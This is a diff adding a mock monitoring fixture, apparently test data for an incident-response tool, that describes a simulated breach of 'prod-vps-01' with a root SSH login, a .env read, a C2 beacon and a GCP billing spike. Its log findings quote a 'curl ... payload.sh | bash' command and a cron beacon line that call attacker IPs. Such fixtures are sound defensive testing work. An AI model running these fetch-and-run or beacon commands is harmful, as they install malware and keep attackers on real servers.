@@ -1,0 +1,85 @@
+{
+  "source": "dynatrace",
+  "time_window": "last_30m",
+  "scenario": "active_breach",
+  "alerts": [
+    {
+      "severity": "critical",
+      "title": "Unauthorized root login detected via SSH",
+      "timestamp": "2026-06-01T03:42:11Z",
+      "affected_service": "prod-vps-01",
+      "problem_id": "P-20260601-001"
+    },
+    {
+      "severity": "critical",
+      "title": "Sensitive file access: .env read by unknown process",
+      "timestamp": "2026-06-01T03:42:15Z",
+      "affected_service": "prod-vps-01",
+      "problem_id": "P-20260601-002"
+    },
+    {
+      "severity": "high",
+      "title": "Outbound connection to known C2 server detected",
+      "timestamp": "2026-06-01T03:43:02Z",
+      "affected_service": "prod-vps-01",
+      "problem_id": "P-20260601-003"
+    },
+    {
+      "severity": "high",
+      "title": "Unusual billing spike: GCP API usage +1200% in 15 minutes",
+      "timestamp": "2026-06-01T03:55:00Z",
+      "affected_service": "billing-api",
+      "problem_id": "P-20260601-004"
+    }
+  ],
+  "suspicious_ips": [
+    {
+      "ip": "185.220.101.42",
+      "reason": "Successful SSH login as root, followed by .env access and curl | bash execution",
+      "confidence": 0.97,
+      "geo": "RU",
+      "first_seen": "2026-06-01T03:42:11Z"
+    },
+    {
+      "ip": "45.142.212.100",
+      "reason": "C2 beacon target — cron job installed by attacker sends periodic requests",
+      "confidence": 0.93,
+      "geo": "NL",
+      "first_seen": "2026-06-01T03:43:05Z"
+    }
+  ],
+  "log_findings": [
+    {
+      "timestamp": "2026-06-01T03:42:11Z",
+      "source": "/var/log/auth.log",
+      "summary": "Accepted publickey for root from 185.220.101.42 port 51234",
+      "risk": "unauthorized_access"
+    },
+    {
+      "timestamp": "2026-06-01T03:42:15Z",
+      "source": "/var/log/audit.log",
+      "summary": ".env file read by unknown process (pid 9182, parent: bash)",
+      "risk": "credential_exposure"
+    },
+    {
+      "timestamp": "2026-06-01T03:42:18Z",
+      "source": "/var/log/syslog",
+      "summary": "curl https://185.220.101.42/payload.sh | bash executed as root",
+      "risk": "malware_execution"
+    },
+    {
+      "timestamp": "2026-06-01T03:43:02Z",
+      "source": "/etc/cron.d/update",
+      "summary": "New cron job added: */5 * * * * curl http://45.142.212.100/beacon",
+      "risk": "persistence_mechanism"
+    },
+    {
+      "timestamp": "2026-06-01T03:55:00Z",
+      "source": "gcp-billing-api",
+      "summary": "GCP API calls spike: 14,800 requests in 15min (normal: ~1,200/day)",
+      "risk": "credential_abuse"
+    }
+  ],
+  "affected_services": ["prod-vps-01", "billing-api", "gcp-project-nekoguard"],
+  "recommended_next_actions": []
+}
